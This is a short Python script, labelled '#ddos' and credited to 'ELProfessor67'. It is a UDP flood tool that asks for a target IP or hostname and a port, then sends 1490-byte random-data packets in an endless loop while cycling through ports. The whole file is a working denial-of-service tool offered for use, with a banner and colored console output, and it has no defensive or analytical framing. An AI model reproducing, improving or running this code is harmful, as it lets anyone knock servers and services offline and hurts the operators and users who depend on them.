#ddos
#version 1.0
#Created by ELProfessor67

from socket import socket,AF_INET , SOCK_DGRAM,SOCK_STREAM,gaierror
from random import _urandom
from os import system
from sys import exit

#########Terminal colors################
red = "\033[1;31m"
blue = "\033[1;34m"
green = "\033[1;32m"
yellow = "\033[1;33m"
white = "\033[1;37m"
default = "\033[0m"

def check_net_con():
  try:
    sock = socket(AF_INET,SOCK_STREAM)
    sock.connect(("www.google.com",80))
  except gaierror:
    print(f"{red} please Check Your Internet Connection {default}")
    exit()
  
######### print banner function ######
def banner():
  global red,blue,green,yellow,white,default
  system("clear" or "cls")
  print(f"""{blue}
   ______   ______   _______  _______  \n
  (  __  \ (  __  \ (  ___  )(  ____ \ \n
  | (  \  )| (  \  )| (   ) || (    \/ \n
  | |   ) || |   ) || |   | || (_____  \n 
  | |   | || |   | || |   | |(_____  ) \n
  | |   ) || |   ) || |   | |      ) | \n
  | (__/  )| (__/  )| (___) |/\____) | \n
  (______/ (______/ (_______)\_______) \n
{default}
  """)
  print(50 * f"{green}_{default}")
  print("\n")
  print(f"\t\t{green}Created By {red}ELProfessor67{default}\n")
  print(50 * f"{green}_{default}")
  print("\n\n")
  
####### we will send requests #######
def req_send(ip,port,byte):
  sock = socket(AF_INET,SOCK_DGRAM)
  send = 0
  while True:
    sock.sendto(byte, (ip,port))
    send += 1
    port += 1
    print (f"{green}Sent{red} {send}{green} packet to{blue} {ip}{green} throught port: {yellow}{port}{default}")
    if port == 65534:
      port = 1

if __name__ == "__main__":
  banner()
  check_net_con()
############ we will take input#####
  try:
    ip = input(f"{green} Enter Target IP or Hostname : {default}")
    port = int(input(f"{green} Enter Port Number : {default}"))
    
    if not (ip == "" or port == ""):
      byte = _urandom(1490)
      req_send(ip,port,byte)
    else:
      print(f"{red}IP address and Port number is required {default}")
      exit()
      
  except ValueError:
    print(f"{red}Port number must be int not a str{default}")
    exit()
  except Exception as err:
    print(f"{red}{err}{default}")
    exit()